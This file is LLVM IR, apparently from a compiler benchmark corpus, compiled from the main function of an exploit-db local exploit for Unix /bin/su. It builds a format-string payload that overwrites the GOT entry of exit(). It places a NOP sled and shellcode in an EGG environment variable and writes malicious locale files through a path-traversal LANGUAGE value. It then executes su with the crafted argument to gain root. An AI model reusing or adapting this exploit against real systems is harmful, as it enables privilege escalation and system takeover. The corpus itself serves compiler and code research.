; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20189.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20189.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [49 x i8] c"Use as: %s <Number of %%.8x> [align] [ret addy]\0A\00", align 1
@FILENAME = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [48 x i8] c"/bin/su is readable - using a GOT overwrite...\0A\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.3 = private unnamed_addr constant [40 x i8] c"GOT entry of function exit() at: 0x%lx\0A\00", align 1
@.str.4 = private unnamed_addr constant [57 x i8] c"/bin/su is unreadable - overwriting a return address...\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"Not implemented yet... Exiting\0A\00", align 1
@THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [16 x i8] c"Using %d %%.8x\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"Using retaddy: 0x%x\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"Using alignment: %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"%.8x\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@hellcode = common dso_local global i8* null, align 8
@.str.13 = private unnamed_addr constant [37 x i8] c"LANGUAGE=sk_SK/../../../../../../tmp\00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"Look mommy, I'm a kiddo!\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"-u\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  store i32 0, i32* %13, align 4
  store i32 -1073742192, i32* %14, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp eq i32 %15, 1
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 0) #3
  unreachable

23:                                               ; preds = %3
  %24 = load i32, i32* @FILENAME, align 4
  %25 = call i64 @mayRead(i32 %24)
  %26 = icmp ne i64 %25, 0
  br i1 %26, label %27, label %33

27:                                               ; preds = %23
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  %29 = load i32, i32* @FILENAME, align 4
  %30 = call i64 @getGOT(i32 %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  store i64 %30, i64* %8, align 8
  %31 = load i64, i64* %8, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0), i64 %31)
  br label %37

33:                                               ; preds = %23
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.4, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %36 = call i32 @exit(i32 0) #3
  unreachable

37:                                               ; preds = %27
  %38 = load i8**, i8*** %6, align 8
  %39 = load i32, i32* @THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING, align 4
  %40 = sub nsw i32 %39, 41
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8*, i8** %38, i64 %41
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @atoi(i8* %43)
  store i32 %44, i32* %12, align 4
  %45 = load i8**, i8*** %6, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %49, label %54

49:                                               ; preds = %37
  %50 = load i8**, i8*** %6, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @atoi(i8* %52)
  store i32 %53, i32* %13, align 4
  br label %54

54:                                               ; preds = %49, %37
  %55 = load i8**, i8*** %6, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 3
  %57 = load i8*, i8** %56, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %64

59:                                               ; preds = %54
  %60 = load i8**, i8*** %6, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strtoul(i8* %62, i32* null, i32 16)
  store i32 %63, i32* %14, align 4
  br label %64

64:                                               ; preds = %59, %54
  %65 = load i32, i32* %12, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0), i32 %65)
  %67 = load i32, i32* %14, align 4
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i32 %67)
  %69 = load i32, i32* %13, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0), i32 %69)
  %71 = load i32, i32* %13, align 4
  %72 = call i8* @strcreat(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 %71)
  store i8* %72, i8** %9, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = load i64, i64* %8, align 8
  %75 = add i64 %74, 2
  %76 = call i8* @longToChar(i64 %75)
  %77 = call i8* @strcreat(i8* %73, i8* %76, i32 1)
  store i8* %77, i8** %9, align 8
  %78 = load i8*, i8** %9, align 8
  %79 = call i8* @strcreat(i8* %78, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 4)
  store i8* %79, i8** %9, align 8
  %80 = load i8*, i8** %9, align 8
  %81 = load i64, i64* %8, align 8
  %82 = call i8* @longToChar(i64 %81)
  %83 = call i8* @strcreat(i8* %80, i8* %82, i32 1)
  store i8* %83, i8** %9, align 8
  %84 = load i8*, i8** %9, align 8
  %85 = load i32, i32* %13, align 4
  %86 = call i8* @strcreat(i8* %84, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 %85)
  store i8* %86, i8** %9, align 8
  %87 = load i32, i32* %12, align 4
  %88 = call i8* @strcreat(i8* null, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 %87)
  store i8* %88, i8** %10, align 8
  %89 = load i8*, i8** %10, align 8
  %90 = load i32, i32* %14, align 4
  %91 = load i32, i32* %12, align 4
  %92 = mul i32 %91, 8
  %93 = call i8* @createDString(i32 %90, i32 %92)
  %94 = call i8* @strcreat(i8* %89, i8* %93, i32 1)
  store i8* %94, i8** %10, align 8
  %95 = call i8* @strcreat(i8* null, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i32 1)
  store i8* %95, i8** %11, align 8
  %96 = load i8*, i8** %11, align 8
  %97 = call i8* @strcreat(i8* %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0), i32 500)
  store i8* %97, i8** %11, align 8
  %98 = load i8*, i8** %11, align 8
  %99 = load i8*, i8** @hellcode, align 8
  %100 = call i8* @strcreat(i8* %98, i8* %99, i32 1)
  store i8* %100, i8** %11, align 8
  %101 = load i8*, i8** %10, align 8
  %102 = call i32 @makeEvilFiles(i8* %101)
  %103 = call i8* @strdup(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.13, i64 0, i64 0))
  %104 = load i8**, i8*** %7, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 0
  store i8* %103, i8** %105, align 8
  %106 = load i8*, i8** %11, align 8
  %107 = load i8**, i8*** %7, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  store i8* %106, i8** %108, align 8
  %109 = load i8**, i8*** %7, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 2
  store i8* null, i8** %110, align 8
  %111 = load i32, i32* @FILENAME, align 4
  %112 = load i8*, i8** %9, align 8
  %113 = call i32 @execl(i32 %111, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i8* %112, i32* null)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @mayRead(i32) #1

declare dso_local i64 @getGOT(i32, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i8* @strcreat(i8*, i8*, i32) #1

declare dso_local i8* @longToChar(i64) #1

declare dso_local i8* @createDString(i32, i32) #1

declare dso_local i32 @makeEvilFiles(i8*) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @execl(i32, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
